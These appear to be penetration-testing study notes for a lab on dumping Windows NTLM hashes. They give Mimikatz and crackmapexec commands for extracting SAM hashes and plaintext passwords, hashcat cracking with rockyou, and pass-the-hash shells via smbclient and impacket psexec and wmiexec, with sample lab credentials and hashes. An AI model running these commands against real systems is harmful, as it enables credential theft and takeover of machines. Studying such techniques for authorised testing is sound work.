# NLTM

SAM database - **C:\Windows\system32\config\sam**&#x20;

## Mimikatz

* located at **C:\tools\mimikatz.exe**

{% hint style="danger" %}
can only extract passwords if  running Mimikatz as Administrator (or higher) and have the [_SeDebugPrivilege_](https://devblogs.microsoft.com/oldnewthing/20080314-00/?p=23113) access right enabled
{% endhint %}

Determine which users exist locally:&#x20;

```
Get-LocalUser
```



Enable <mark style="color:purple;">SeDebugPrivilege</mark>, elevating to SYSTEM user privileges and extract NTLM hashes:

{% code title="mimikatz" overflow="wrap" %}
```powershell
privilege::debug

token::elevate

lsadump::sam
```
{% endcode %}

Attempt to extract plaintext passwords:

```
sekurlsa::logonpasswords
```

## Crackmapexec

{% code overflow="wrap" %}
```sh
crackmapexec smb 192.168.105.95 -u Eric.Wallows -p 'EricLikesRunning800' -d SECURA --sam
```
{% endcode %}

## Cracking NLTM hashes

get correct hashcat mode for NLTM:

```sh
hashcat --help | grep -i "ntlm"
```

Crack hash:

{% code overflow="wrap" %}
```sh
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
{% endcode %}

## Passing NLTM hashes

Connect to SMB with NLTM hash:

{% code overflow="wrap" %}
```sh
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```
{% endcode %}

* &#x20;**--pw-nt-hash:** indicates the hash

Use the **psexec.py** script from the impacket library with NLTM hash to get an interactive shell:

{% code overflow="wrap" %}
```sh
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```
{% endcode %}

* **00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b**: format is "LMHash:NTHash". Since we only use the NTLM hash, we can fill the LMHash section with 32 0's.
* receive a shell as SYSTEM

Use the **wmiexec.py** script from the impacket library with NLTM hash to get an interactive shell as the user used for authentication:

{% code overflow="wrap" %}
```sh
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
whoami
```
{% endcode %}

* LMHash:NTHash hash format
* receive shell as Administrator
